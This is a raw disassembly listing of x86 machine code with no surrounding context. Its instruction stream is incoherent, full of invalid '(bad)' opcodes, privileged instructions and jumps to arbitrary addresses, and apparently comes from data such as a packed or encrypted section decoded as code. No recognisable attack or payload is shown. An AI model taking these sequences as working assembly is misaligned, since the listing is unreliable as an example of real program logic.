  40932f:	mov    ebx,0xd95e2281
  409334:	(bad)
  409337:	enter  0x9809,0xa7
  40933b:	adc    BYTE PTR [edi-0x4a],0x43
  40933f:	mov    al,ds:0xfde0c5e4
  409344:	dec    edi
  409345:	pop    eax
  409346:	or     al,ch
  409348:	aas    
  409349:	sbb    BYTE PTR [ebx+0x5e10e179],dl
  40934f:	mov    al,ds:0xca0fc066
  409354:	test   BYTE PTR [esi-0x7f],bh
  409357:	daa    
  409358:	fbld   TBYTE PTR [edi+0x1a2c16f3]
  40935e:	(bad)  
  40935f:	repnz test BYTE PTR [edi+0x133ea0a8],al
  409366:	loope  0x4093af
  409368:	imul   eax,DWORD PTR [ecx],0x5ea3d48b
  40936e:	sbb    al,0xe6
  409370:	icebp  
  409371:	jbe    0x409319
  409373:	outs   dx,DWORD PTR ds:[esi]
  409374:	adc    BYTE PTR [ebx-0x36051f0],al
  40937a:	and    ebx,DWORD PTR ds:0x31a04f57
  409380:	sbb    ebp,DWORD PTR [ecx+0x33]
  409383:	push   0xae265669
  409388:	sahf   
  409389:	mov    edi,0x6145e002
  40938e:	cs add al,0x26
  409391:	jle    0x409337
  409393:	ficomp WORD PTR es:[edx+0x58]
  409397:	in     al,0x4
  409399:	cmp    edx,ebx
  40939b:	in     eax,dx
  40939c:	dec    ecx
  40939d:	pop    edx
  40939e:	and    ebp,esp
  4093a0:	ss pop ebp
  4093a2:	and    esp,eax
  4093a4:	jge    0x4093a0
  4093a6:	xchg   ebp,eax
  4093a7:	xchg   esi,eax
  4093a8:	bound  ebx,QWORD PTR [ebp-0x319b7a6d]
  4093ae:	jb     0x4093dd
  4093b0:	mov    eax,ds:0x817e2218
  4093b5:	(bad)  
  4093b6:	fist   DWORD PTR [ebx+esi*1-0x7da2188c]
  4093bd:	sub    BYTE PTR [esi+edi*1+0x64],al
  4093c1:	sbb    al,0x95
  4093c3:	sti    
  4093c4:	div    BYTE PTR ds:0x9bc83783
  4093ca:	in     eax,dx
  4093cb:	xchg   ecx,eax
  4093cc:	inc    ebx
  4093cd:	mov    dl,0x5d
  4093cf:	arpl   bp,bx
  4093d1:	sbb    DWORD PTR [ebx+0x59],ecx
  4093d4:	(bad)  
  4093d6:	nop
  4093d7:	mov    BYTE PTR ds:0x809ed913,0x9d
  4093de:	mov    BYTE PTR [ebp-0x4c4739a5],ah
  4093e4:	add    ah,0x98
  4093e7:	mov    DWORD PTR [edi-0x452e83c0],edi
  4093ed:	fisttp DWORD PTR [edx-0x766515a3]
  4093f3:	push   ebx
  4093f4:	int3   
  4093f5:	ret    0x4f72
  4093f8:	les    edi,FWORD PTR [ebx+0x3d]
  4093fb:	adc    esi,DWORD PTR [edi+0x4e]
  4093fe:	dec    esi
  4093ff:	xor    al,0x86
  409401:	or     BYTE PTR [esi+0x2afbf6fd],bl
  409407:	iret   
  409408:	mov    dh,0x13
  40940a:	mov    esi,0xe9cd0882
  40940f:	int    0x9c
  409411:	aaa    
  409412:	sub    DWORD PTR [eax+ebx*8-0x43],eax
  409416:	or     ah,dl
  409418:	adc    BYTE PTR [eax+0x67],bl
  40941b:	aaa    
  40941c:	mov    eax,ds:0x24157911
  409421:	xlat   BYTE PTR ds:[ebx]
  409422:	scas   eax,DWORD PTR es:[edi]
  409423:	mov    esp,0x441d4661
  409428:	push   0x5a53d6c
  40942d:	stc    
  40942e:	mov    dl,BYTE PTR [edi-0x750e050d]
  409434:	jnp    0x409469
  409436:	add    ch,BYTE PTR [edx+0x623a8c2f]
  40943c:	jl     0x40946e
  40943e:	mov    ds:0xc4ac276,eax
  409443:	ins    DWORD PTR es:[edi],dx
  409444:	or     al,0x10
  409446:	(bad)  
  409447:	cmc    
  409448:	icebp  
  409449:	addr16 jmp 0x677:0xf87baee1
  409451:	or     DWORD PTR [ebx+edi*2+0x3a],edx
  409455:	(bad)  
  409456:	mov    ebp,0x9586fb18
  40945b:	mov    al,0xa4
  40945d:	mov    edi,0x47e9f67e
  409462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409463:	in     al,dx
  409464:	mov    dh,0xe2
  409466:	aad    0x65
  409468:	das    
  409469:	ficomp DWORD PTR [ecx-0x68138ab2]
  40946f:	frstor [ebx]
  409471:	test   DWORD PTR [esi],ecx
  409473:	rcr    BYTE PTR [ebp-0x6f],0x6c
  409477:	inc    eax
  409478:	dec    edx
  409479:	out    dx,al
  40947a:	and    BYTE PTR [edi],cl
  40947c:	and    eax,0xec2f4bea
  409481:	mov    eax,0x94978109
  409486:	inc    eax
  409487:	mov    dh,0x1
  409489:	cld    
  40948a:	js     0x4094d2
  40948c:	xor    edx,DWORD PTR [ebp+0x0]
  40948f:	js     0x409489
  409491:	lahf   
  409492:	xchg   ebp,eax
  409493:	(bad)  
  409494:	dec    DWORD PTR [edx-0x1f]
  409497:	lods   eax,DWORD PTR ds:[esi]
  409498:	sti    
  409499:	push   edi
  40949a:	lock ret 0xff9c
  40949e:	mov    dl,0xcb
  4094a0:	enter  0xb009,0xca
  4094a4:	add    BYTE PTR [ebx],bh
  4094a6:	push   eax
  4094a7:	arpl   WORD PTR [edx],ax
  4094a9:	dec    eax
  4094aa:	sbb    eax,0x910f3ce8
  4094af:	out    dx,eax
  4094b0:	arpl   bx,ax
  4094b2:	sahf   
  4094b3:	and    eax,0xc346179f
  4094b8:	(bad)
  4094bc:	and    eax,0x2b2a0969
  4094c1:	cs mov eax,0xfc0abbfc
  4094c7:	jo     0x4094f0
  4094c9:	push   cs
  4094ca:	xchg   esp,eax
  4094cb:	or     esi,ebp
  4094cd:	xor    BYTE PTR [ebx-0x363a1358],ah
  4094d3:	push   ds
  4094d4:	emms   
  4094d6:	push   eax
  4094d7:	call   0xb84c:0xccc89246
  4094de:	mov    dl,0x21
  4094e0:	inc    edx
  4094e1:	pop    eax
  4094e2:	mov    esp,0x4899b4ba
  4094e7:	outs   dx,DWORD PTR ds:[esi]
  4094e8:	xchg   DWORD PTR [ebx],esi
  4094ea:	int    0xa1
  4094ec:	enter  0xafaf,0xb8
  4094f0:	adc    BYTE PTR [edx],cl
  4094f2:	test   al,0x43
  4094f4:	gs lahf 
  4094f6:	mov    ebp,0xc3da837f
  4094fb:	sub    ah,BYTE PTR [ebp-0x58]
  4094fe:	ss mov ch,0x10
  409501:	dec    esi
  409502:	ss ins DWORD PTR es:[edi],dx
  409504:	pusha  
  409505:	xchg   edx,eax
  409506:	cmp    edi,esi
  409508:	call   0x7b86c04c
  40950d:	mov    edx,0x9636aca0
  409512:	sbb    edi,DWORD PTR [edx]
  409514:	dec    esi
  409515:	push   ebx
  409516:	inc    edx
  409517:	clgi   
  40951a:	adc    DWORD PTR [ebp+0x30],0xe207f2f9
  409521:	pop    DWORD PTR [esi-0x20]
  409524:	xor    BYTE PTR [edi+edi*1],ch
  409527:	adc    ch,BYTE PTR [edx-0x1b]
  40952a:	fistp  QWORD PTR [edi]
  40952c:	fiadd  WORD PTR [esi+ecx*8+0x2]
  409530:	fnsave [ebp+0x5bb5c28]
  409536:	xchg   ebp,eax
  409537:	jae    0x4094f9
  409539:	push   es
  40953a:	inc    eax
  40953b:	mov    dl,al
  40953d:	dec    eax
  40953e:	push   ebp
  40953f:	loope  0x4094e6
  409541:	fwait
  409542:	out    0x18,al
  409544:	jbe    0x40957f
  409546:	fwait
  409547:	dec    esi
  409548:	push   0x4c
  40954a:	mov    al,ds:0x514fb000
  40954f:	push   eax
  409550:	(bad)
  409553:	ror    BYTE PTR [edx-0x7d],1
  409556:	adc    al,0x6f
  409558:	jb     0x4095b4
  40955a:	ret    
  40955b:	(bad)
  40955e:	push   esi
  40955f:	pop    ebp
  409560:	lock sbb ch,al
  409563:	add    DWORD PTR ds:0x133c109f,esp
  409569:	mov    cs,WORD PTR [ebp+0x75]
  40956c:	mov    al,ds:0x4436bf7c
  409571:	inc    edx
  409572:	in     eax,dx
  409573:	mov    ah,BYTE PTR [edi+0x54]
  409576:	xlat   BYTE PTR ds:[ebx]
  409577:	in     al,0x20
  409579:	daa    
  40957a:	(bad)  
  40957b:	or     eax,0x4d22aaa1
  409580:	mov    BYTE PTR [edi],dl
  409582:	shl    DWORD PTR [ecx-0x5c4deb76],1
  409588:	outs   dx,BYTE PTR ds:[esi]
  409589:	inc    ebp
  40958a:	or     dh,bl
  40958c:	clc    
  40958d:	test   DWORD PTR [esi-0x30],edi
  409590:	fldcw  WORD PTR [eax+ecx*1]
  409593:	ins    DWORD PTR es:[edi],dx
  409594:	in     al,dx
  409595:	jge    0x4095ba
  409597:	push   ebx
  409598:	dec    esp
  409599:	mov    eax,DWORD PTR [edx]
  40959b:	test   BYTE PTR [eax-0x5d08d5b1],dh
  4095a1:	xchg   ebp,eax
  4095a2:	popa   
  4095a3:	inc    esp
  4095a4:	pop    esp
  4095a5:	shl    BYTE PTR [eax],1
  4095a7:	call   0xfb87:0xa6222f90
  4095ae:	addr16 call 0x560b0a99
  4095b4:	(bad)  
  4095b5:	fwait
  4095b6:	jns    0x40953b
  4095b8:	and    BYTE PTR [ecx],dh
  4095ba:	add    eax,0x3b74724
  4095bf:	jb     0x4095d9
  4095c1:	add    BYTE PTR [edi+0x25],ch
  4095c4:	add    dh,BYTE PTR ds:0xc0114fe9
  4095ca:	sbb    DWORD PTR [edi],0x4e
  4095cd:	dec    ebx
  4095ce:	lea    edi,[edx+ecx*1-0x59]
  4095d2:	(bad)  
  4095d3:	push   ecx
  4095d4:	mov    ds:0x498bfdc5,eax
  4095d9:	cdq    
  4095da:	int    0xba
  4095dc:	out    0x8f,al
  4095de:	loopne 0x40957c
  4095e0:	xor    al,0xd6
  4095e2:	mov    edi,esi
  4095e4:	mov    edi,0xdb0f2534
  4095e9:	adc    eax,0x29dc33df
  4095ee:	rcl    BYTE PTR [ebx+0x44d44d62],1
  4095f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095f6:	mov    esi,0xe12c2b14
  4095fb:	inc    edi
  4095fc:	cmp    cl,BYTE PTR [esi]
  4095fe:	mov    ds:0xd56ff223,eax
  409603:	jae    0x409628
  409605:	jmp    0xb45:0xcbf17bb9
  40960c:	aas    
  40960d:	ja     0x40963f
  40960f:	jge    0x4095a8
  409611:	popa   
  409612:	adc    DWORD PTR [edi],edi
  409614:	or     ch,BYTE PTR [esi+ecx*8+0x55]
  409618:	xchg   edx,eax
  409619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40961a:	cmp    eax,edi
  40961c:	adc    DWORD PTR [ebx+0x4a],ebx
  40961f:	ret    
  409620:	clc    
  409621:	push   edi
  409622:	cld    
  409623:	shr    DWORD PTR [edi],cl
  409625:	repnz xor DWORD PTR [eax+0x388df0eb],0xffffff97
  40962d:	xor    eax,0xe3083f3e
  409632:	sub    eax,0x9a8a8057
  409637:	cmp    edi,DWORD PTR [ebx]
  409639:	and    eax,0xc481a95b
  40963e:	jge    0x409618
  409640:	scas   eax,DWORD PTR es:[edi]
  409641:	jae    0x4095cf
  409643:	stc    
  409644:	cwde   
  409645:	int3   
  409646:	mov    gs,WORD PTR [ebx]
  409648:	adc    al,0xda
  40964a:	mov    cl,0xda
  40964c:	aam    0xa9
  40964e:	inc    esp
  40964f:	int3   
  409650:	and    dh,0x2d
  409653:	sub    al,0x3c
  409655:	push   ebx
  409656:	stos   DWORD PTR es:[edi],eax
  409657:	jno    0x4096c6
  409659:	test   BYTE PTR [edx+esi*4],ch
  40965c:	xor    BYTE PTR [ecx-0x480a4d23],0xa8
  409663:	mov    BYTE PTR [ebx-0x58],0xcf
  409667:	cld    
  409668:	loop   0x4096bf
  40966a:	sub    al,0x32
  40966c:	mov    eax,ds:0x2f72103c
  409671:	inc    esi
  409672:	xchg   esp,eax
  409673:	adc    BYTE PTR [edx+0x265fe190],ch
  409679:	mov    ch,0xf
  40967b:	into   
  40967c:	xchg   ebx,eax
  40967d:	lock sub DWORD PTR ss:[ecx-0x4872a274],eax
  409685:	mov    ah,0xf9
  409687:	dec    ebp
  409688:	mov    BYTE PTR [edi+0x37],bh
  40968b:	stos   BYTE PTR es:[edi],al
  40968c:	push   edi
  40968d:	jmp    0x4a991e2b
  409692:	inc    esi
  409693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409695:	repz test DWORD PTR [esi+ebx*4-0xd],esi
  40969a:	push   ss
  40969b:	pop    ebp
  40969c:	xor    esi,DWORD PTR [edx]
  40969e:	pop    ecx
  40969f:	cmp    BYTE PTR [eax],0xe5
  4096a2:	cwde   
  4096a3:	xchg   ebp,eax
  4096a4:	cmp    al,0x31
  4096a6:	sbb    DWORD PTR [esi+ebx*4+0x1f],esi
  4096aa:	mov    cl,0x40
  4096ac:	adc    eax,0x72c74af1
  4096b1:	xor    eax,0x7d8ba037
  4096b6:	mov    eax,0xa3f1f4e3
  4096bb:	rep lods eax,DWORD PTR ds:[esi]
  4096bd:	add    al,0x22
  4096bf:	adc    eax,0x4542535a
  4096c4:	stos   DWORD PTR es:[edi],eax
  4096c5:	sbb    eax,0x89002b00
  4096ca:	shl    DWORD PTR [ecx+0x12],cl
  4096cd:	popa   
  4096ce:	(bad)  
  4096cf:	call   0x2e426780
  4096d4:	pop    ecx
  4096d5:	jg     0x4096f3
  4096d7:	js     0x4096c8
  4096d9:	pop    edi
  4096da:	(bad)  [eax+0x17cdc32c]
  4096e0:	push   ecx
  4096e1:	mov    ch,0x9
  4096e3:	cmp    al,0x75
  4096e5:	lods   eax,DWORD PTR ds:[esi]
  4096e6:	and    dh,0x3
  4096e9:	in     al,dx
  4096ea:	cmc    
  4096eb:	and    eax,0xcb8af48f
  4096f0:	xchg   esi,eax
  4096f1:	and    al,BYTE PTR [edx-0x286a2308]
  4096f7:	sub    ecx,DWORD PTR [edx]
  4096f9:	imul   edi,DWORD PTR [ebx-0x356c880f],0x37
  409700:	adc    BYTE PTR [eax],ah
  409702:	add    edx,ecx
  409704:	pop    esp
  409705:	fchs   
  409707:	arpl   WORD PTR [ebp+ebx*2-0x28],dx
  40970b:	inc    edx
  40970c:	jnp    0x4096f6
  40970e:	imul   BYTE PTR [esp+edx*8]
  409711:	or     BYTE PTR ds:0x87ea4eb0,bh
  409717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409718:	call   0x4ae2:0x422707b4
  40971f:	push   es
  409720:	not    edi
  409722:	or     DWORD PTR ds:0x7dbe8f48,esp
  409728:	lods   eax,DWORD PTR ds:[esi]
  409729:	pop    eax
  40972a:	aad    0x8f
  40972c:	jno    0x409756
  40972e:	jns    0x40977f
  409730:	jne    0x40979f
  409732:	xchg   ecx,eax
  409733:	fs loop 0x409795
  409736:	jl     0x4097a9
  409738:	imul   esp,DWORD PTR [ebx],0xffffffd0
  40973b:	inc    ecx
  40973c:	pop    edx
  40973d:	ficomp WORD PTR [esi+eax*4-0x1d60c020]
  409744:	imul   esp,ebp,0xffffff98
  409747:	mov    edi,0x8f90a864
  40974c:	sub    eax,0x88ddb53a
  409751:	cmp    ah,BYTE PTR [edi-0x63]
  409754:	mov    cl,0x8c
  409756:	fcom   DWORD PTR [esp+edi*8]
  409759:	jge    0x40977c
  40975b:	and    edi,DWORD PTR [ebx+0xb]
  40975e:	sbb    eax,ebx
  409760:	ja     0x4096f8
  409762:	mov    dh,0x26
  409764:	hlt    
  409765:	test   BYTE PTR [eax-0xb4a70cb],cl
  40976b:	pop    eax
  40976c:	repz pop ebp
  40976e:	lea    ebx,[esi+0x7b]
  409771:	mov    eax,ds:0x91ba172e
  409776:	dec    eax
  409777:	push   ss
  409778:	ret    0x45b0
  40977b:	and    bl,dl
  40977d:	mov    WORD PTR [ebp+0x67931688],gs
  409783:	scas   eax,DWORD PTR es:[edi]
  409784:	pop    ebp
  409785:	sbb    ch,BYTE PTR [edi]
  409787:	pop    es
  409788:	mov    ds:0x68a4b76c,al
  40978d:	(bad)  
  40978e:	loope  0x4097e7
  409790:	pop    ss
  409791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409792:	dec    ebp
  409793:	cmp    al,0x0
  409795:	repnz push esp
  409797:	(bad)  
  409798:	fistp  WORD PTR [edx+0x2f]
  40979b:	push   ebx
  40979c:	call   0xe450:0x41ebd842
  4097a3:	loope  0x40975e
  4097a5:	sbb    DWORD PTR [ebp-0x6d],esi
  4097a8:	inc    edi
  4097a9:	pop    ecx
  4097aa:	jae    0x409805
  4097ac:	add    dh,bh
  4097ae:	data16 fst QWORD PTR [ecx]
  4097b1:	push   0x85f0bf77
  4097b6:	mov    ds:0xd60bc9e1,al
  4097bb:	popf   
  4097bc:	iret   
  4097bd:	mov    ebp,0xc6d3ae31
  4097c2:	push   es
  4097c3:	cmp    al,0x4
  4097c5:	test   al,0xf
  4097c7:	push   ds
  4097c8:	cmp    bl,bh
  4097ca:	and    dh,BYTE PTR [ecx+0x32]
  4097cd:	push   ds
  4097ce:	into   
  4097cf:	and    cl,ah
  4097d1:	adc    dh,dl
  4097d3:	outs   dx,BYTE PTR ds:[esi]
  4097d4:	or     BYTE PTR [ebp-0x3363f858],0xec
  4097db:	adc    cl,BYTE PTR [ecx]
  4097dd:	fwait
  4097de:	cmp    eax,0x45145cd7
  4097e3:	popa   
  4097e4:	(bad)  [edi-0x10f550fe]
  4097ea:	scas   al,BYTE PTR es:[edi]
  4097eb:	add    DWORD PTR [edi],esi
  4097ed:	xchg   DWORD PTR [esi-0x46282912],ecx
  4097f3:	hlt    
  4097f4:	xchg   ebx,eax
  4097f5:	pop    esp
  4097f6:	repz or BYTE PTR [ecx-0x3088dc4a],0xcb
  4097fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097ff:	hlt    
  409800:	mov    bl,0xee
  409802:	mov    esp,0x767a8e6f
  409807:	call   0xa752:0xc1fa68e
  40980e:	int3   
  40980f:	adc    eax,0xafa73f1f
  409814:	add    ebp,ebx
  409816:	ja     0x40979d
  409818:	inc    esp
  409819:	jo     0x40983e
  40981b:	mov    BYTE PTR [esi],al
  40981d:	pop    edi
  40981e:	fild   QWORD PTR gs:[edx]
  409821:	sbb    BYTE PTR [edx],cl
  409823:	cmp    DWORD PTR [ebx-0x6b],edi
  409826:	mov    al,ds:0x81fd26c7
  40982b:	sbb    BYTE PTR [ecx],dl
  40982d:	xchg   DWORD PTR [edi],ecx
  40982f:	enter  0xe35a,0xa6
  409833:	daa    
  409834:	fdiv   DWORD PTR ds:0xa4951cf5
  40983a:	push   edi
  40983b:	popf   
  40983c:	(bad)  
  40983d:	ret    
  40983e:	jecxz  0x4097f5
  409840:	add    BYTE PTR [bp+di-0x5a],cl
  409844:	clc    
  409845:	pop    ds
  409846:	or     edx,DWORD PTR [ebx+eax*2]
  409849:	push   eax
  40984a:	loop   0x40982f
  40984c:	xchg   BYTE PTR [ebx+esi*2+0x633dc400],bh
  409853:	or     eax,0x8a2d5396
  409858:	jo     0x409869
  40985a:	sbb    cl,BYTE PTR [eax-0x6369e42]
  409860:	push   0xffffffc9
  409862:	pcmpeqd mm7,QWORD PTR [ebx]
  409865:	inc    ebp
  409866:	mov    esi,0x72f13702
  40986b:	imul   edi,DWORD PTR [edi],0x12
  40986e:	pop    ecx
  40986f:	or     BYTE PTR [ecx-0x9dbfdb5],dh
  409875:	or     BYTE PTR [esi-0x65],dh
  409878:	ror    BYTE PTR [ecx*8+0x1d3f3581],cl
  40987f:	shl    DWORD PTR ds:0xd31b30ff,1
  409885:	cwde   
  409886:	ins    DWORD PTR es:[edi],dx
  409887:	enter  0xe152,0x91
  40988b:	lahf   
  40988c:	add    edi,DWORD PTR [ebx-0x56]
  40988f:	jnp    0x40988a
  409891:	jno    0x4098d6
  409893:	repz xchg ebx,eax
  409895:	xchg   esi,eax
  409896:	cmp    eax,0xf5b4f253
  40989b:	mov    gs,WORD PTR [ebp-0x7815ba8f]
  4098a1:	or     eax,0x8f89261
  4098a6:	sbb    esp,DWORD PTR [eax+0x5a]
  4098a9:	sub    al,0xaf
  4098ab:	ficomp DWORD PTR [edx+0x69b6fcb0]
  4098b1:	inc    esi
  4098b2:	pop    esi
  4098b3:	push   ecx
  4098b4:	fstp   DWORD PTR [edx]
  4098b6:	push   ss
  4098b7:	enter  0x63a2,0xb4
  4098bb:	push   0x7ba9636d
  4098c0:	mov    ebp,0xc8a60998
  4098c5:	ret    0x7d8a
  4098c8:	aam    0xfe
  4098ca:	dec    ebp
  4098cb:	mov    ds,WORD PTR [edx-0x57]
  4098ce:	mov    ebx,0x9f733d13
  4098d3:	mov    esi,eax
  4098d5:	jmp    0x3429:0x7919c013
  4098dc:	int3   
  4098dd:	add    BYTE PTR [ecx+0x1a],ch
  4098e0:	imul   eax,DWORD PTR [edi+0x6d],0xffffff8d
  4098e4:	mov    dl,0x36
  4098e6:	jl     0x4098b9
  4098e8:	int    0xa0
  4098ea:	jg     0x4098b0
  4098ec:	lods   eax,DWORD PTR ds:[esi]
  4098ed:	fnstsw WORD PTR [edi]
  4098ef:	inc    edi
  4098f0:	es hlt 
  4098f2:	sbb    ah,BYTE PTR [ebp-0x4f43a87d]
  4098f8:	xor    ch,al
  4098fa:	into   
  4098fb:	int3   
  4098fc:	lds    esp,FWORD PTR [ecx]
  4098fe:	ja     0x409889
  409900:	jmp    0xb6df491
  409905:	test   al,0xb5
  409907:	mov    esi,0xd460154b
  40990c:	cmc    
  40990d:	call   DWORD PTR [edi+0x64]
  409910:	dec    ecx
  409911:	or     esp,edx
  409913:	push   edx
  409914:	shr    BYTE PTR [eax+0x73666e7e],0x9a
  40991b:	mov    ds:0x7c6a224,eax
  409920:	les    esi,FWORD PTR [ecx]
  409922:	scas   al,BYTE PTR es:[edi]
  409923:	add    al,0xa1
  409925:	jg     0x40994d
  409927:	adc    ecx,edi
  409929:	test   ah,cl
  40992b:	mov    al,ds:0x14d9b5eb
  409930:	fwait
  409931:	add    DWORD PTR [esi-0x451f9724],0xffffffe3
  409938:	icebp  
  409939:	es xchg edi,eax
  40993b:	and    BYTE PTR [eax],dl
  40993d:	push   ebx
  40993e:	and    DWORD PTR [ecx-0x5b],edi
  409941:	aaa    
  409942:	lea    ebp,[esi]
  409944:	sub    al,0xb4
  409946:	neg    BYTE PTR [ecx-0x45]
  409949:	fimul  WORD PTR [ebp+0x13]
  40994c:	push   edi
  40994d:	mov    ah,0x43
  40994f:	mov    ebp,0x5202f0cb
  409954:	nop
  409955:	rol    DWORD PTR [ebp-0x5c],0x27
  409959:	retf   
  40995a:	jmp    0xc885c33d
  40995f:	jb     0x40993b
  409961:	out    0x7f,al
  409963:	inc    ebp
  409964:	loop   0x4099a7
  409966:	xlat   BYTE PTR ss:[ebx]
  409968:	cdq    
  409969:	mov    bl,0xe7
  40996b:	cmp    DWORD PTR [esi-0x26c74b9c],0x303746e5
  409975:	pop    esi
  409976:	(bad)  
  409977:	pop    ss
  409978:	fs sub eax,0x884d4f34
  40997e:	loop   0x4099e1
  409980:	xchg   esp,eax
  409981:	xlat   BYTE PTR ds:[ebx]
  409982:	popa   
  409983:	xor    DWORD PTR [ebp+0x4f17b679],0x39
  40998a:	jo     0x4099c9
  40998c:	sub    bh,BYTE PTR [ebp-0x19c57259]
  409992:	sub    bh,BYTE PTR [edx-0x6ad74e22]
  409998:	loop   0x409932
  40999a:	popa   
  40999b:	jmp    0xb565:0x67516b2f
  4099a2:	iret   
  4099a3:	and    ch,ah
  4099a5:	xor    dl,BYTE PTR [ebx-0x1e]
  4099a8:	imul   edx,DWORD PTR [ecx],0xcb192909
  4099ae:	shl    BYTE PTR [edi+esi*1-0x6eee18af],0x33
  4099b6:	pop    edx
  4099b7:	iret   
  4099b8:	les    esi,FWORD PTR [esi-0x6a]
  4099bb:	popw   ss
  4099bd:	adc    dl,0x7a
  4099c0:	aam    0xf2
  4099c2:	inc    esp
  4099c3:	loope  0x40996c
  4099c5:	int    0x5b
  4099c7:	or     bl,BYTE PTR [edi+eiz*2+0x41d1c710]
  4099ce:	in     eax,dx
  4099cf:	jbe    0x4099f3
  4099d1:	jmp    0x409954
  4099d3:	add    esi,ebp
  4099d5:	outs   dx,DWORD PTR ds:[esi]
  4099d6:	test   al,0x2e
  4099d8:	pop    ecx
  4099d9:	sbb    ch,cl
  4099db:	and    al,0xad
  4099dd:	push   ss
  4099de:	adc    eax,0xd53dffcc
  4099e3:	fst    DWORD PTR [eax+ebp*1+0x2e]
  4099e7:	mov    ds:0xb6b6e99d,al
  4099ec:	out    dx,eax
  4099ed:	pop    ss
  4099ee:	add    BYTE PTR gs:0xf3913663,ch
  4099f5:	dec    esp
  4099f6:	inc    ebp
  4099f7:	sub    BYTE PTR [edx+ecx*2],al
  4099fa:	push   es
  4099fb:	retf   0x997e
  4099fe:	dec    eax
  4099ff:	out    0x7,eax
  409a01:	mov    edx,es
  409a03:	push   es
  409a04:	mov    bl,0xd
  409a06:	pop    ebp
  409a07:	xchg   DWORD PTR [eax-0x68b6eca3],esp
  409a0d:	pop    edi
  409a0e:	ss fcmovne st,st(5)
  409a11:	out    dx,al
  409a12:	push   0xe7dffd63
  409a17:	ja     0x409a78
  409a19:	cld    
  409a1a:	mov    WORD PTR [edx+0x69],?
  409a1d:	cli    
  409a1e:	not    DWORD PTR [esi+edx*2+0x4ad70b7b]
  409a25:	dec    edi
  409a26:	adc    ecx,DWORD PTR ds:0x51e4c63b
  409a2c:	rcr    edx,cl
  409a2e:	jno    0x4099ea
  409a30:	or     bl,BYTE PTR [esp+eiz*8]
  409a33:	mov    dh,0xd1
  409a35:	mov    dl,bh
  409a37:	(bad)  [ebp-0x11]
  409a3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a3b:	pop    esi
  409a3c:	ins    BYTE PTR es:[edi],dx
  409a3d:	mov    ebx,0x5f567c93
  409a42:	fs daa 
  409a44:	add    ecx,0xa1f6131b
  409a4a:	push   ecx
  409a4b:	jmp    0x409a43
  409a4d:	cmp    ecx,edx
  409a4f:	call   0xc5d1e396
  409a54:	es push cs
  409a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a57:	ror    ebx,cl
  409a59:	int3   
  409a5a:	push   0x78033e51
  409a5f:	sbb    DWORD PTR [eax+0x60b2c8a5],ecx
  409a65:	jno    0x409a9e
  409a67:	into   
  409a68:	push   ds
  409a69:	mov    esi,0x22592220
  409a6e:	mov    eax,0x3fddb7ce
  409a73:	aas    
  409a74:	jae    0x409ae7
  409a76:	sbb    dh,0x30
  409a79:	jg     0x409a66
  409a7b:	pop    esi
  409a7c:	and    dh,dh
  409a7e:	add    BYTE PTR [ecx+0x6c],bh
  409a81:	sbb    cl,ch
  409a83:	inc    ebp
  409a84:	jno    0x409adf
  409a86:	jmp    0xf579:0x4ce92801
  409a8d:	xchg   ebp,eax
  409a8e:	out    dx,al
  409a8f:	sbb    BYTE PTR [ebp+0x26],0xc5
  409a93:	mov    ecx,0x6afbca89
  409a98:	psubb  mm4,QWORD PTR [ebp+0x7]
  409a9c:	jmp    0x409a9d
  409a9e:	mov    dl,bh
  409aa0:	cdq    
  409aa1:	adc    al,0xb9
  409aa3:	(bad)  
  409aa5:	adc    ebx,edx
  409aa7:	mov    eax,ds:0x39cf8fdf
  409aac:	stc    
  409aad:	cmp    al,0xca
  409aaf:	inc    edi
  409ab0:	push   edi
  409ab1:	cdq    
  409ab2:	lock retf 
  409ab4:	clc    
  409ab5:	pop    edx
  409ab7:	out    dx,al
  409ab8:	leave  
  409ab9:	push   edi
  409aba:	push   0x1c5be74c
  409abf:	dec    ecx
  409ac0:	and    al,0xd7
  409ac2:	fxtract 
  409ac4:	xlat   BYTE PTR ds:[ebx]
  409ac5:	es and eax,0x5b3aa8b1
  409acb:	xchg   DWORD PTR [eax],edx
  409acd:	nop
  409ace:	and    al,0xf4
  409ad0:	(bad)  
  409ad1:	int    0x55
  409ad3:	push   esp
  409ad4:	nop
  409ad5:	in     eax,dx
  409ad6:	inc    ecx
  409ad7:	retf   
  409ad8:	stos   DWORD PTR es:[edi],eax
  409ad9:	(bad)  
  409ada:	cmp    cl,BYTE PTR [esi-0x35]
  409add:	and    al,0x40
  409adf:	sahf   
  409ae0:	sbb    BYTE PTR [edi],cl
  409ae2:	lods   al,BYTE PTR ds:[esi]
  409ae3:	adc    al,0xc1
  409ae5:	stos   DWORD PTR es:[edi],eax
  409ae6:	push   esi
  409ae7:	or     eax,0x453442a3
  409aec:	and    dl,ch
  409aee:	mov    ds:0xc0ce0e43,eax
  409af3:	push   edx
  409af4:	dec    edi
  409af5:	test   DWORD PTR [ecx+0x69],ebx
  409af8:	outs   dx,BYTE PTR ds:[esi]
  409af9:	das    
  409afa:	sbb    BYTE PTR [eax+0x21b59bc5],0x18
  409b01:	popf   
  409b02:	mov    eax,0xac8a73a6
  409b07:	adc    ch,BYTE PTR [eax-0x3f39cea0]
  409b0d:	test   ch,0x2e
  409b10:	sub    edi,esi
  409b12:	pushf  
  409b13:	daa    
  409b14:	scas   al,BYTE PTR es:[edi]
  409b15:	call   0xf8bf8ee5
  409b1a:	sbb    bh,cl
  409b1c:	cdq    
  409b1d:	inc    edi
  409b1e:	mov    eax,ds:0xd1532b6e
  409b23:	(bad)  
  409b24:	in     eax,dx
  409b25:	inc    edx
  409b26:	out    dx,al
  409b27:	and    DWORD PTR [eax-0x3c],eax
  409b2a:	loope  0x409b22
  409b2c:	xchg   esp,eax
  409b2d:	rol    DWORD PTR [eax+0x41f805ab],0xb6
  409b34:	enter  0x2f8d,0xee
  409b38:	push   esp
  409b39:	scas   eax,DWORD PTR es:[edi]
  409b3a:	mov    al,0x15
  409b3c:	add    eax,0xdf04390c
